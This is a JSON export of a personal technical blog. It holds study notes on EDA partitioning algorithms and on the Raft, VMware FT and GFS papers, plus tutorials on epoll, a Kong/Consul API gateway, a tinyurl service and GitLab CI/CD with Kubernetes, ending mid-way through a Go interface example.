[{"content":"  Goal  Balanced bipartition. divided the circuit into 2 equal-sized partitions.    Applied directly on hypergraph   Bucket data structure  Like bucket sort, we first prepare some bucket to boost the sorting process. Bucket size  from $max(\\forall size(edge))$ to $-max(\\forall size(edge))$      Iteratively move(each iteration is called \u0026ldquo;pass\u0026rdquo;)  Randomly bipartitioning the graph $G$ with hyperedge Do procedure on the unmarked vertex until no unmarked exist  First compute the gain value for all node.  $x \\in P_1$ $FS(x)$ is the number of nets that have $x$ as the only cell in $P_1$ $TE(x)$ is the number of nets that contain $x$ and are entirely in $P_1$ $gain(x) = FS(x) - TE(x)$   move the vertex $x$ with maximum value of gain to the opposite under the area constraint, and then mark vertex $x$  Use bucket to sort the maximum value. area constraint(after moving) : $|size(P_1) - size(P_2)| \\leq 1$   re-compute the gain value of the unmarked neighbor vertex of $x$ . Record the $gain(x, y)$ and the current cut size   If the initial cut size has reduced during the current \u0026ldquo;pass\u0026rdquo;  Do the other \u0026ldquo;pass\u0026rdquo; on the best solution Otherwise, terminate.      ","permalink":"https://BWbwchen.github.io/posts/fiduccia_and_mattheyses_algorithm/","summary":"Note for EDA partitioning algorithm Fiduccia and Mattheyses algorithm (FM algorithm)","title":"Fiduccia and Mattheyses algorithm (FM algorithm)"},{"content":"  Goal  Balanced bipartition. divided the circuit into 2 equal-sized partitions.    Rewrite the original circuit graph into edge-weighted undirected graph $G$  Rewrite the original circuit graph with hyper-edge, and it can share the same node.  Edge weight $c(x, y)$ = $\\frac{1}{|e| - 1}$ , where $e$ is a hyper-edge and $|e|$ is the size of that hyper-edge.      Iteratively swap(each iteration is called \u0026ldquo;pass\u0026rdquo;)  Randomly bipartitioning the graph $G$ (above rewritten graph) Do procedure on the unmarked vertex until no unmarked exist  Compute all the possible swap pairs on the unmarked vertex.  for vertex $x \\in P_1$ , we define:  $E_x = \\sum_{i \\in P_2} c(x, i)$ This is the cut size of outward edge. $I_x = \\sum_{i \\in P_1} c(x, i)$ This is the cut size of inward edge.   for vertex $x \\in P_1, y \\in P_2$ , if we swap them, the decrease of the cut size between $P_1$ and $P_2$ is :  $gain(x, y) = (E_x - I_x - c(x, y)) + (E_y - I_y - c(x, y))$     Find the pair with maximum $gain(x, y)$ , swap $(x, y)$ , and then mark vertex $x$ and $y$ . Record the $gain(x, y)$ and the current cut size   If the initial cut size has reduced during the current \u0026ldquo;pass\u0026rdquo;  Do the other \u0026ldquo;pass\u0026rdquo; on the best solution Otherwise, terminate.      ","permalink":"https://BWbwchen.github.io/posts/kernighan_and_lin_algorithm/","summary":"Note for EDA partitioning algorithm Kernighan and Lin algorithm (KL algorithm)","title":"Kernighan and Lin algorithm (KL algorithm)"},{"content":"  Goal  Translate the boolean network to K-input lookup table. (with input pin constraint) For FPGA K-input lookup table. The maximum delay from PI to PO is minimized.    Assumption  DAG each node has a 0 delay inter-cluster has unit delay intra-cluster has 0 delay    User constraint  pin limit    Labeling phase  Get a topological sort : $T$ (without PI) $l$ is the delay.  each node has a 0 delay   For each ordered node $t$ , construct graph $N_t$ , which contains all of the parent of $t$ . then add a source node $S$ to $N_t$ and connect it to all PIs node.  Compute $p = max(l(\\forall \\text{fan-in node of }t))$ Construct $N_t \u0026lsquo;$ , where $l(v) = p, v \\in N_t$ , $v$ will be collapsed into $t$ (同樣的 p值則縮點) Construct a flow-network $N_t\u0026rsquo;'$ and duplicate the none- $s$ and none- $t$ node -\u0026gt; $(x, x'), e(x, x') = 1$ , the other edge are $\\infty$ Find the cut $C(X'', \\bar{X''})$ with cut size(number of edge in this cut) $\\leq$ pin constraint  If found  $cluster(t)$ or in the paper $\\overline{X_t} = \\text{collapsed node and t} \\in N_t'$ $l(t) = p$   If not found  $cluster(t)$ or in the paper $\\overline{X_t} = t$ $l(t) = p + 1$     $l_v = max(l_1, l_2)$ (maximum delay of node $v$ with cluster size limit)      Mapping phase  Try to combine some cluster. Put all PO nodes in a set $L$ Answer clusters will be in $S$ For each remove node $v$ from $L$  Push $cluster(v)$ in to $S$ $L = L \\cup input \\text{-} node(cluster(v))$ , where the node in $input \\text{-} node(cluster(v))$ have not formed the cluster yet also not PI nodes(not in the answer set $S$ yet).   Until $L$ empty.    ","permalink":"https://BWbwchen.github.io/posts/flowmap_algorithm/","summary":"Note for EDA cluster algorithm FlowMap algorithm","title":"FlowMap algorithm"},{"content":"  Goal  Maximum delay from PI(primary input) to PO(primary output) is minimized    Assumption  DAG each node has a unique delay inter-cluster has constant delay intra-cluster does not incur any delay    User constraint  Node delay Edge delay Cluster size limit    Labeling phase  Compute $\\Delta(x, v)$ , which means the maximum delay from $x$ to $v$ Get a topological sort : $T$ (without PI) $l$ is the delay.  PI node : 1 non-PI node initialize with 0   For each ordered node $v$ , construct graph $G_v$ , which contains all of the parent of $v$  Compute $l_v(x)$ , $x \\in G_v / {v}$  $l_v(x) = l(x) + \\Delta(x, v)$ ( the delay of path from PI to $x$ then to $v$ )   Sort $l_v(x)$ in decreasing order: $S$ Push the element one-by-one from $S$ to $cluster(v)$ with cluster size limit Computer $l_1$ (intra-cluster delay) and $l_2$ (inter-cluster delay).  If $cluster(v)$ contains any PI nodes  $l_1 = max(l_v(\\forall PI \\text{ } node))$   If size of $S$ is bigger than cluster size limit  $l_2 = max(l_v(\\forall x) + D), x \\in G_v / v$ , $D$ is inter-cluster delay.     $l_v = max(l_1, l_2)$ (maximum delay of node $v$ with cluster size limit)      Clustering phase  Try to combine some cluster. Put all PO nodes in a set $L$ Answer clusters will be in $S$ For each remove node $v$ from $L$  Push $cluster(v)$ in to $S$ $L = L \\cup input \\text{-} node(cluster(v))$ , where the node in $input \\text{-} node(cluster(v))$ have not formed the cluster yet(not in the answer set $S$ yet).   Until $L$ empty.    ","permalink":"https://BWbwchen.github.io/posts/rajaraman_and_wong_algorithm/","summary":"Note for EDA cluster algorithm Rajaraman and Wong algorithm","title":"Rajaraman and Wong algorithm"},{"content":"  Goal  Solve split-brain by majority vote. Leader election Log replication Safety The stronger degree of coherency    5 Property  Election safety: Only 1 leader. Leader Append-Only : leader only append new entry in its log. (No delete its log). Log Matching : identify log entry by (term number, log index). Leader Completeness: if a log entry is committed in a given term, then it will appear in the leader\u0026rsquo;s log. State Machine Safety: If a machine has an applied log entry at index $t$ , then no other server will have a applied different entry at index $t$ .    Consensus Algorithm  Keeping the replicated log in replicated state machine consistent. Once commands are properly replicated, each server’s state machine process them and make each server identical    Raft Basics  Terms (Time, clock)   When does the term end? #raft_problem\n   A follower receives no communication over a period of time(election timeout), and it begins an election to choose a new leader.      Raft divides time into terms.\n  Each term begins with an election.\n  Act as a logical clock to distinguish which server is newer.\n  Use term number to detect inconsistencies.\n   State  How to know the total number of the cluster? #raft_problem  By configuration.     RPCs Calls  RequestVote AppendEntries  replicate log heartbeat message(append 0 entries)     Log  (Term number, Log index) can represent an unique log entry. A log entry is considered committed if it is stored on majority of the servers (safe for that entry to be applied to the state machine).  Leader will decides when to apply the log entry command. #raft_problem        Leader election    A follower receives no communication over a period of time(election timeout), and it begins an election to choose a new leader.   heartbeat time \u0026laquo; election timeout \u0026laquo; infinity Raft paper use 10ms ~ 500ms.    increase its current term numbers and change the state to the candidate.    There are 3 cases:   a. It wins the election  it receives votes from a majority of the servers, which with the same term, in the cluster. How to vote? Vote for whom? → first-come-first-serve. It became a leader and sends heartbeat messages to all of the other servers.   b. another server is a leader already.  The leader’s term \u0026gt;= the candidate’s term → candidate became a follower. The leader’s term \u0026lt; the candidate’s term → candidate rejects the leader and continues the election.   c. no winner(eg. split vote)  retry with a randomized election timeout.      There are some restriction for leader election:\n Leader election restriction      Log replication  Leader receive the client request → append the command to leader\u0026rsquo;s log → issue AppendEntries to all followers → leader applied the log and return.  What if follower crash? #raft_problem  leader retries the AppendEntries RPC indefinitely.     Consistency issue  properties : (2 entries in different logs have :)    the same (term number, log index) → same entry command    the same (term number, log index) → all of the preceding entries are the same (consistency check)     If the follower receive a log entry which doesn\u0026rsquo;t have any matched (term number, log index) with follower\u0026rsquo;s log, refuse to update, drop it. Leader crash will lead to inconsistencies.  Committing entries from previous terms   Solved by overwriting the followers' logs with leader\u0026rsquo;s log.  find the latest log entry where leader and follower agree → delete all the log entry after that entry → leader send the remain part.  leader will maintain a nextIndex for each follower. If the nextIndex is different, the RPC failed. → leader decrease the nextIndex and try to match.  nextIndex = index of the next new log entry.  (prevLogIndex, prevLogTerm)   Initialize nextindex with leader\u0026rsquo;s next new log entry index.            Safety  Each state machine should execute exactly same commands in the same order.  Leader election restriction  Leader for any given term ^^contains the entire previous term committed log.^^  Ensure this property from the moment of election.   When election, candidate request a RequestVote RPC.  the voter will compare the (term number, index number)  the candidate is older than voter → deny. the candidate is more up-to-date than voter → vote it.   How to compare? #raft_problem  Compare term first, new is better, then compare log index, new is better.        Committing entries from previous terms  What if the leader crashes during committing an entry? What should new leader do? How to determine commitment?  A log entry is considered committed if it is stored on majority of the servers (safe for that entry to be applied to the state machine). Only term 1 was committed. (c) shouldn\u0026rsquo;t happen.  Only try to commit NOW new entry to the replicas, once we done this, all prior (un-)committed entry will be automatically committed.   Follower and candidate crashes  Solved by overwriting the followers' logs with leader\u0026rsquo;s log.        Dynamic member in the cluster (configuration change mechanism)  Each server has different timing to apply the new configuration.  Can\u0026rsquo;t directly change, caused it will have 2 leader in some cases.    Two-phase approach  original configuration → old and new configuration (joint consensus) → new configuration In the joint consensus phase, old and new configuration work together to serve Raft service.    Problem  New servers need a long time to initialize.  New server will be in non-voting state until it caught up with the rest of the cluster. (by leader\u0026rsquo;s snapshot Log Compaction (by snapshot) )   The leader of joint consensus phase leader may not be part of the new configuration.  leader step down to follower state. Wait for a new election.   Removed server may disrupt the cluster by re-election.  server disregard(ignore) RequestVote RPC during the minimum election timeout of hearing from the leader.        Log Compaction (by snapshot)      Majority Vote  odd number of servers.  If you have $2x + 1$ servers, then there can tolerant at most $x$ broken servers in order to run normally.      With Application  Record the client request    Start(request) -\u0026gt; (log index, term numbers)   Problem  Does the failure really frequently happen? #raft_problem  Failure may not happened so frequently But slow follower will happen frequently.  Could we mix the slow follower and failure up? #raft_problem        ","permalink":"https://BWbwchen.github.io/posts/raft/","summary":"Paper note of Raft consensus algorithm","title":"Raft"},{"content":"VMware FT Goal  Use Replication to achieve Fault-tolerance.  Constraint  Cannot fix the software bug.  Replication  They all copy their own state, but the definition of the state is different.  State Transfer  Primary backup its own state(memory, data), and send them to the backup server. If the primary is fail-stop, we can use the backup server instead.  Replicated State Machine  Primary backup its own state(command), and send them to the backup server. If the primary is fail-stop, we can use the backup server instead.  VMWare FT  It replica all the things, including RAM, register\u0026hellip;etc. But GFS will only replica application-level data, such as chunks. Use disk server as the local disk. Use log channel for backup server to sync the primary log event. (eg, sync generating random numbers, etc.)  Non-Deterministic Events  The time of the interrupt.  Normally, the input in this system is a network package, while the DMA of the network card receives a package, it will copy the content into memory, and trigger an interrupt, which could differ in time. Solution: Bounce Buffer. When a package is received. VMM will stop the primary, and copy the package content into the primary memory and trigger an interrupt of the primary’s network card and then memorize the id of the now instruction. It does something to the backup server and makes an interrupt at the id of the instruction of the primary interrupt instruction.   Weird instructions  eg. use system time.   Multi-process(didn’t be mentioned in this paper, this paper is only for single-core processor)  It’s unpredictable for the order of the instruction execution on multi-process.    Output Rule The output of the primary will be sent by a simulated network card, and the output of the backup server will be discarded.\n What if the network between primary and backup server crash and the primary dead? The values in backup and primary are different.  When the backup server receives the primary log(input) first, then send output to the outside client. Bottleneck here, since the primary need to sync and wait for the backup server. (What if) input into primary, but output from backup?   What if the response had been sent to the client, but primary crash. But the original request hasn’t been executed by the backup server?  When the service switch to the backup server, it will wait until the backup server consumes all the buffered request and have the same state as the original primary then it will start to take over the duty.  Duplicate output? Nope, since the output package will have the same information as the primary output package, it will be filtered out at the TCP level.      Test-and-Set  What if the network between the primary and backup servers was broken, but the primary and backup servers were all healthy? They all think that the other is dead so it needs to take over for the duty.  Call the third party service(test-and-set service) to decide, whether use the primary or backup server. Whenever we need to change the primary, we need to connect with the test-and-set service first to decide whether we could switch or not. It’s like a lock.    ","permalink":"https://BWbwchen.github.io/posts/vmware_ft/","summary":"Paper note of VMware FT","title":"VMware FT paper note"},{"content":"GFS Goal  全局通用的儲存系統 高容量高速→ 需要 sharding 自動修復 大量順序讀取，record append  Constraint  在一個 data center. 可以允許一點點的錯誤 only guarantees that the data is written at least once as an atomic unit. → If writing success, data must have been written at the same offset on all replicas of some chunk.  Architecture  單一 master node, 多個 chunk server  Master Node  管理文件與 chunk info (file → chunk IDs)  Use read-write lock → concurrent mutation in the same directory.    儲存：（要存在硬碟，不用存在硬碟）  file → Chunk handlers Chunk handlers → Chunk Data  每個 chunk 在哪個 chunk server 上 Chunk version number 主 chunk 在哪個 chunk server （因為寫入必須要在主 chunk） 主 chunk expiration time.     使用 log 紀錄每一次的操作  Chunk Server  儲存實際 data 64MB 為一個 chunk 並依照 chunk id 作為 filename 存成一個檔案  Tech 讀   client 發出請求讀 file, offset\n  master 得知該 file 的 chunk id list，透過 offset / 64 得到對應的 chunk id\n  master 將該 chunk id 所在的 chunk server id list 與 chunk id(handle) 傳回給 client.\n   client 從 chunk server id list(cache this!) 挑一個獲取 data\n  client 將 chunk handle(id), byte range 交給 chunk server\n  chunk server 將對應的 chunk id file with byte range 讀出交給 client\n  寫 Record Append (追加在文件最後面)  只能對 主 chunk (Primary Chunk) 來寫入  But, What if the primary chunk doesn\u0026rsquo;t exist? find the up-to-date chunk replicas. (By the version number!!) → (Not found? Crash) The other will be the secondary chunk Notify the primary and secondary servers of their roles and new version numbers. [The data in the primary and secondary servers are up-to-date??] [primary will notify the offset so if it is not up-to-date, it will leave a hole.] Giving the expiration time for the primary. (prevent multiple primary servers, split-brain!!) Increase the chunk version number   If the master wants to change the primary server, it can wait until the primary is expired. (Not communication needed!) If the writing data is too large, break it down into multiple write operations.   Client 提供 filename 並要求追加內容→ master Master → the server which contains the primary chunk (Primary server) The client sends the data to the primary and secondary servers, and the server will save them in a temporary place. After the primary and secondary server receives the data → \u0026ldquo;Receive the data!\u0026rdquo; to Client  The primary will check whether need a new chunk. Optimization: Send the data to the nearest server, and propagate it to the other server.   Client \u0026ldquo;Append record now!\u0026rdquo; → Primary write the data and notify the secondary server to write data. the secondary will return the status to the primary server, \u0026ldquo;yes\u0026rdquo; or \u0026ldquo;no\u0026rdquo;.  All \u0026ldquo;yes\u0026rdquo; → \u0026ldquo;Done\u0026rdquo; to Client. else → \u0026ldquo;Fail\u0026rdquo; to Client. The client should start from 1.  But!! The chunk server will Not recover the original data!      Garbage Collection  Rename the filename into a hidden name with a deletion timestamp. During the master’s regular scan, it removes the file and metadata.  Error Handle Data Consistent  不同 chunk server 的 data 可能會略有不同！ The primary will notify the offset so if it is not up-to-date, it will leave a hole.  The client needs to tolerant the out-of-order data order.    If you want to make it a 強一致性 :  Detect the repeated request. whether this request is retry. Primary - secondary should be a two-phase commit.  Problem  Out of RAM of the master node. Too many requests for a single master node.  ","permalink":"https://BWbwchen.github.io/posts/gfs/","summary":"Paper note of Google File System","title":"Google File System paper note"},{"content":"Introduction I have implemented a JWT microservice. But I need an API gateway to redirect the outside HTTP request to the inner network. We need a server to receive an HTTP request and then redirect to the corresponding microservice. How do we know the actual IP address in our network? One is to hard-code the IP address in the API gateway. You can also use service discovery to register your microservice IP address. So you can dynamically start service or shutdown service. In this tutorial, I use consul as my service discovery registry.\nService discovery Let’s talk about service discovery first. There are 2 types of service discovery. One is client-side, another is server-side. Client-side means you get the actual IP address of a microservice from the service discovery registry first, then use that IP address to access the microservice. Server-side means you send a request to the service discovery registry, and it will help you to query the corresponding microservice then send back the microservice response to you.\nCode I use consul as service registry and Kong as API gateway and use docker-compose to set up my docker containers.\ndocker-compose.yml version: \u0026#34;3.5\u0026#34; services: jwt_service: container_name: jwt_service build : context : ./jwt target: deploy  environment: SECRETKEY: asdf localIP: 192.168.18.5 PORT: 8087 consul_url: consul:8500 networks: net: ipv4_address: 192.168.18.5 expose : - 8087 depends_on: - consul consul : container_name : consul image: consul networks: net: ipv4_address: 192.168.18.4 expose: - 8500 - 8600/udp ports: - \u0026#34;8700:8500\u0026#34; kong: image: kong:latest volumes: - ./kong.yml:/usr/local/kong/declarative/kong.yml environment: - KONG_DATABASE=off - KONG_DECLARATIVE_CONFIG=/usr/local/kong/declarative/kong.yml - KONG_PROXY_ACCESS_LOG=/dev/stdout - KONG_ADMIN_ACCESS_LOG=/dev/stdout - KONG_PROXY_ERROR_LOG=/dev/stderr - KONG_ADMIN_ERROR_LOG=/dev/stderr - KONG_ADMIN_LISTEN=0.0.0.0:8001, 0.0.0.0:8444 ssl - KONG_DNS_RESOLVER=192.168.18.4:8600 ports: - \u0026#34;8000:8000\u0026#34; - \u0026#34;8443:8443\u0026#34; - \u0026#34;127.0.0.1:8001:8001\u0026#34; - \u0026#34;127.0.0.1:8444:8444\u0026#34; networks: - net networks: net: driver: bridge ipam: config: - subnet: 192.168.18.0/24 gateway: 192.168.18.1 We need to edit the config file for the Kong API gateway. I set the DNS resolver to the consul. I use the docker bridge network to assign a static IP directly to each microservice container. If we didn’t assign a static IP, we use the service name to represent the IP address of each container. When we access that IP, we will get the actual IP of that container from docker. You can think that we use docker as a DNS resolver. But we use consul as DNS resolver! So it won’t know what is the actual IP address of the service name. Make sure to assign a static IP to microservice! This is how I make it. If you have another good method to do it, please tell me!\nkong.yml _format_version: \u0026#34;2.1\u0026#34; _transform: false services: - name: jwt-service url: http://jwt_service.service.dc1.consul routes: - name: jwt-route paths: - /jwt We set the URL to the service name that we register to the consul.\nThen I can access my microservice with path /jwt !\n If you have any problems, feel free to ask me!\nYou can find me here 👉 tim.chenbw@gmail.com\nSubscribe to my substack here! 👉 subscribe me on substack !\n","permalink":"https://BWbwchen.github.io/posts/api-gateway-with-kong/","summary":"API gateway with Kong","title":"API gateway for microservice with Kong"},{"content":"Tinyurl Recently, I learned the system design and tried my best to implement a full-stack tinyurl service. Throughout this journey, I also learned how to build a CI/CD pipeline (you can check this posts) and also learned how to use kubernetes.\nArchitecture I built this service on my own server, used nginx to serve static vue frontend.\nI design this system aim to have 100 URLs requents per second, So the shorten name will have 7 characters and generated by use MD5.\nFirst, each api server got a range of number from Zookeeper, and then use that number to generate the MD5 value, this method can guarantee that the hash code won\u0026rsquo;t collision.\nSecond, take the first 7 characters as short name, you need to check whether this short name is existing in the database. If existed in database, just shift a character.\nThird, store into database and redis cache.\nFor get long URL, find in redis cache first. if not found, find in the database.\nDeploy I deployed my service on rancher kubernetes 2.4.16 CI/CD (both frontend and backend) I managed my code in self-hosted gitlab with gitlab-ci.\nbackend frontend Problem   Although I had checked the short name collision, I still got a lot of collision. Then I found it is the api server\u0026rsquo;s problem. A client send request to api server, server will create a thread to handle that request, and use the counter number to compute the hash value. What if 2 thread use counter value simultaneously ? They will use same value to compute short name, and that short name doesn\u0026rsquo;t in database and they will be store in database and redis cache!\nSo I make a mutex lock on counter variable to fix this bug.\n  Vue environment variable disappear when deploy on kubernetes. When I build the docker image of Vue frontend, I can\u0026rsquo;t build it with backend way. In my api server, I can modify environment variable when I deploy the service on Kubernetes. I can input the environment variable in deployment yaml file. But when I do the same thing to Vue frontend docker image. I can not pass the environment variable via deployment yaml. At the end, I found that I should input the environment variable when I build the docker image.\n  Future I want to try to import microservice to this project, or future project.\n","permalink":"https://BWbwchen.github.io/posts/tinyurl/","summary":"Build a Full-Stack Tinyurl service in golang using Gin, Redis, MongoDB and Zookeeper","title":"Tinyurl"},{"content":"Blocking and Non-Blocking When you send a request to server. Server will prepare some data for you (I/O operations). When you wait for data preparation, your program :\n hang up the thread until the server finished the preparation and send response to you. (Blocking) will get response immediately, but you probably got an error, if server hasn\u0026rsquo;t finished the data preparation. Your program need to polling the server and checking error code of each request. But you are not blocked ! (Non-Blocking)  Synchronous and Asynchronous When you send a request to server. Server will prepare some data for you (I/O operations). When you wait for data preparation, your program :\n hand up the thread until the server finished the preparation and send treponse to you. (Synchronous) will get response immediately, but server will run your request in \u0026ldquo;backgroung\u0026rdquo;. When server finished your request, it will notify you, or run the callback function. (Asynchronous)  Non-Blocking I/O in C Normally, you can\u0026rsquo;t read or write directly to disk files. They usually do it via the kernel buffer cache as a proxy. But if you want to read or write directly, use O_SYNC flag when opening the disk file.\nYou can put any file descriptor in the nonblocking mode, just setting the no-delay flag O_NONBLOCK, which is an I/O operating mode, when opening the file.\nReadiness of Descriptors We called it \u0026ldquo;ready\u0026rdquo;. When a file descriptor can perform an I/O operation without blocking, such as the arrival of new input or sock connection establishment etc. There are 2 ways to find out the readiness of descriptors.\nLevel Triggered (select, poll, epoll) (when the condition is met) At any time, we \u0026ldquo;try to\u0026rdquo;(or poll for) perform an I/O operation on an non-blocking descriptor. If the I/O operation blocks, the system call returns an error. If the I/O operation ready, we can actually perform the entire I/O operation or just do nothing.\nEdge Triggered (Asynchronous) (when the status changed) When the I/O operation is ready, it will notify the process or \u0026ldquo;PUSH\u0026rdquo; to the process. The process can attempt to perform the maximum operation it possibly can every time it get a descriptor readiness notification, or it will need to wait until next notification arrival.\nBut even with both 2 non-blocking methods, an extremely large read or write call has the potential to block.\nSelect level triggered mechanism.\nint select( int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout ); Select monitors 3 independent sets of descriptors.\n readfds, check if a read will not block writedfs, check if a write will not block exceptfds, monitored for exceptional conditions.  Poll But what if you want not just read, write or exceptional conditions ? Use poll ! we pass in a set of descriptors each marked event that it needs to track.\nint poll(struct pollfd *fds, nfds_t nfds, int timeout); struct pollfd { int fd; /* file descriptor */ short events; /* requested events */ short revents; /* returned events */ }; Epoll (event poll) Epoll instance is a kernel data structure. It allows for a process to monotor multiplex I/O on mltiple descriptors. You have 3 system call to control epoll instance :\nepoll_create() #include \u0026lt;sys/epoll.h\u0026gt; int epoll_create(int size); The size augrument, which is the number of descriptors, is ignored since Linux 2.6.8.\n#include \u0026lt;sys/epoll.h\u0026gt; int epoll_create1(int flags); flags can only be either 0 or EPOLL_COLEXEC.\n flags is 0, it is the same as epoll_create(). flags is EPOLL_COLEXEC, it will set close-on-exec flag on the new file descriptor.  epoll_ctl() #include \u0026lt;sys/epoll.h\u0026gt; int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event); It preformed op on target fd in epfd with event\nop  EPOLL_CTL_ADD EPOLL_CTL_MOD EPOLL_CTL_DEL  events typedef union epoll_data { void *ptr; int fd; uint32_t u32; uint64_t u64; } epoll_data_t; struct epoll_event { uint32_t events; /* Epoll events */ epoll_data_t data; /* User data variable */ }; events is just a bitmask that indicates which events fd is being monitored for. For example:\nEPOLLIN : The associated file is available for read operations. EPOLLOUT : The associated file is available for write operations. If you want to perform multiple events, just OR-ing them.\nepoll_wait() #include \u0026lt;sys/epoll.h\u0026gt;int epoll_wait(int epfd, struct epoll_event *eventlist, int maxevents, int timeout); blocks until any descriptor being monitored become ready for I/O\nThe bowels of epoll In process Let\u0026rsquo;s first learn how the descriptor works. I create a file descriptor in process A, I will get a file descriptor. The system will store the descriptor and it\u0026rsquo;s file pointer in a table in my process A. Every entry in this table has 2 fields :\n descriptor flags. file pointer, point to an underlying kernel open file table. indexed by descriptor.  In kernel Each file pointer point to an entry in kernel open file table. each entry in kernel open file table has 3 fields :\n file offset status flags inode pointer.  In filesystem Then each inode pointer point to an entry in filesystem inode table. each entry in filesystem inode table has some fields :\n file type. file locks. etc.  How epoll works process A call epoll_create() to create an epoll instance. The system will create an entry in kernel open file table, and it point to an entry in inode table. secondly, process A call epoll_ctl() to add a file descriptor fd0 to the epoll instance\u0026rsquo;s interset list. The system will point the fd0 in epoll instance to fd0 in kernel open file table (NOTICE: the kernel open file table entry is shared by referenced descriptor !!)\nexample Consider the situation above, process A fork process B without close-on-exec, process B will have table as same as process B. for example, process A have fd0 and fork process B, it have a descriptor fd1. But fd0 and fd1 point to the same underlying kernel open file table entry.\nFork epoll So same case, but the fd0 and fd1 in the above case is epoll descriptor. process A call epoll_wait(), after a moment it got notifications. But at the same time, process B will also got the notifications !!!\nSo we can say once a file descriptor is registered by a process with the epoll instance, it will continue getting notifications about events on the descriptor even if it closes the descriptors as long as the underlying open file descriptor is still referenced by at least one descriptor.\nPerformance Select and poll are O(N) (or O(number of descriptors being monitored)), but epoll is O(1) (or O(number of events that have occurred)). Because every time the descriptor become ready, kernel will add it into the ready list in epoll instance. Once process call epoll_wait(), just return the ready list.\n","permalink":"https://BWbwchen.github.io/posts/http_server_in_go/","summary":"let\u0026rsquo;s study about epoll, blocking and non-blocking","title":"Epoll study"},{"content":"Motivation During the internship at Logitech, I refactor and optimize the internal test tool. When I finished the coding, my manager ask me to write a detailed document to record the core logic in this test tool.\nWhen I wrote the document, my manager ask me to use MOSCOW notation to list down the requirements of this test tool.\nBut, What is MOSCOW notation ? 🤔\nMeaning MoSCoW is an acronym derived from four letters of each prioritization : M for MUST HAVE, S for SHOULD HAVE, C for COULD HAVE and W for WON\u0026rsquo;T HAVE. It didn\u0026rsquo;t have O, just for word pronounceable.\nExample So when I write a test tool(prime detector) to detect prime number and composite number and we plan to detect floating point in the future, I will need to write the below requirement.\nPRIMEDETECTOR-1: MUST detect the prime number. PRIMEDETECTOR-2: MUST detect the composite number. PRIMEDETECTOR-3: SHOULD detect the floating point. ","permalink":"https://BWbwchen.github.io/posts/moscow_notation/","summary":"What is MOSCOW notation?","title":"Moscow_notation"},{"content":"Recently, I have been writting a tinyURL service with a CI/CD pipeline on self-hosted gitlab. I want to record this horrible and time-consuming self-taught journey.\nOur CI/CD pipeline will be composed with test, build and deploy. We first test the code, check whether there is any mistake in our code logic. Second, we build it to binary. Finally, we deploy our binary on the cloud or your own kubernetes.\nEnvironment  golang 1.16.5 docker 20.10.7 docker-compose 1.29.2 rancher 2.4.16 gitlab-runner with docker executor  tinyURL tinyURL was written for self-taught with backend developement, kubernetes, docker and DevOps. User will give the service a longURL. Service will give back the short name of that URL. Once user query the service with the short name, service will need to give back the original long URL. for more info, check this\nThis is the overview architecture: Test on Local Notice that the whole system comprises 4 main module: api server, redis service, mongodb service and Zookeeper service. So I choose docker-compose to build a testing environment. Let\u0026rsquo;s check the setting yaml file:\nversion: \u0026#34;3\u0026#34; services: server: container_name: myshorturl image: shorturl_test ports: - 8081:8081 environment: REDIS_URL: redis:6379 DB_URL: db:27017 ZOOKEEPER_URL: zookeeper:2181 PORT: 8081 depends_on: - redis - db - zookeeper redis: container_name: redis image: redis:alpine expose: - 6379 db: container_name: monogodb image: mongo:4.0.26-xenial expose: - 27017 zookeeper: container_name: zookeeper image: zookeeper:3.7.0 expose: - 2181 There are 3 things to notice:\n Firstly, Make sure the version number is 3, or it will fail in the testing pipeline. Secondly, if api server want to connect with other service, connect the service name directly. eg: How to connect db ? just \u0026lt;dbprotocol\u0026gt;://db, such like : postgresql://db Lastly, the difference between ports and expose.  Ports will expose the port number and also publish them to the host machine. Expose will expose the port between the containers, it will not publish the port to the host machine.    Then run with command (it will shutdown containers automatically, if api-server finished test):\n$ docker-compose up --abort-on-container-exit --exit-code-from server Test test-job: stage: test before_script: - apk add docker-compose - docker build -f Dockerfile-ci --tag shorturl_test . script: - docker-compose up --abort-on-container-exit --exit-code-from server Since we use gitlab-runner docker executor with docker:stable image as default image, it only provide docker command. You can check the official documentation. We need to install the docker-compose command for testing. use apk to install it. Then build a docker image for golang testing command.\n# Dockerfile-ciFROMgolang:1.16WORKDIR/appCOPY . .CMD [ \u0026#34;go\u0026#34;, \u0026#34;test\u0026#34;, \u0026#34;-v\u0026#34; Build build-job: image: name: gcr.io/kaniko-project/executor:debug entrypoint: [\u0026#34;\u0026#34;] stage: build script: - mkdir -p /kaniko/.docker - echo \u0026#34;{\\\u0026#34;auths\\\u0026#34;:{\\\u0026#34;$DOCKER_REGISTRY\\\u0026#34;:{\\\u0026#34;username\\\u0026#34;:\\\u0026#34;${DOCKER_REGISTRY_USER}\\\u0026#34;,\\\u0026#34;password\\\u0026#34;:\\\u0026#34;${DOCKER_REGISTRY_PASSWORD}\\\u0026#34;}}}\u0026#34; \u0026gt; /kaniko/.docker/config.json - /kaniko/executor --context $CI_PROJECT_DIR --dockerfile $CI_PROJECT_DIR/Dockerfile --destination $DOCKER_IMAGE We use pre-build image to handle this stage.\nDeploy Now, We will try to deploy our service on kubernetes. I use rancher for kubernetes.\nThere are some things need to sure.\n kubeconfig file. docker registry username, password  First, deploy a deployment on kubernetes. So we can automatically deploy the next job trigger.\ndeploy-job: stage: deploy image: dtzar/helm-kubectl before_script: - sed -ie \u0026#34;s/deploy-date-value/$(date)/g\u0026#34; kubernetes/deploy.yaml - mkdir -p /root/.kube/ \u0026amp;\u0026amp; touch /root/.kube/config - echo ${KUBERNETES_KUBE_CONFIG} | base64 -d \u0026gt; ${KUBECONFIG} script: - kubectl apply -f kubernetes/deploy.yaml I use deply-date-value as a trigger to trigger the deployment update.\nFinal The CI/CD pipeline should run successfully ! Hooray ! 🎉\nIf you have other problem, feel free to ask me !\nYou can find me here 👉 tim.chenbw@gmail.com\n","permalink":"https://BWbwchen.github.io/posts/shorturlcicd/","summary":"CI/CD on gitlab-ci with kubernetes","title":"CI/CD on gitlab-ci"},{"content":"Let\u0026rsquo;s check this example :\ntype SQL struct { table SQL.table } We want CRUD (create, read, update, delete) operation. So you might write the code like this :\npackage main import \u0026#34;fmt\u0026#34; type SQL struct { table string } func (s SQL) Create () { fmt.Println(\u0026#34;Create\u0026#34;) } func (s SQL) Read () { fmt.Println(\u0026#34;Read\u0026#34;) } func (s SQL) Update (criteria string) { fmt.Println(\u0026#34;Update\u0026#34;, criteria) } func (s SQL) Delete (criteria string) { fmt.Println(\u0026#34;Delete\u0026#34;, criteria) } type ORM interface{ 